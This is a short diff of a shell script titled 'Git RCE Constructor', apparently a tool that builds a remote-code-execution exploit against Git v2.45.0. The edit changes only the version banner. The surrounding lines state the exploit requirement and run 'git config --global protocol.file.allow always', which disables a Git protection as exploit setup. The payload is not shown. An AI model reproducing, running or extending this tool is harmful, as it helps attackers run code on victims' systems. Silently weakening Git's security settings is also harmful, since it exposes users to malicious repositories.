@@ -6,8 +6,8 @@ echo -n "Operation failed!"
 read -N 1
 exit 0
 }
-echo Git RCE Constructor v1.8.0 \(Local Mode\)
-echo -e "\033]0;Git RCE Constructor v1.8.0 (Local Mode)\007"
+echo Git RCE Constructor v1.9.0 \(Local Mode\)
+echo -e "\033]0;Git RCE Constructor v1.9.0 (Local Mode)\007"
 echo Notice: You must use Git v2.45.0 for this exploit to work!
 set -x
 git config --global protocol.file.allow always ||error_handler
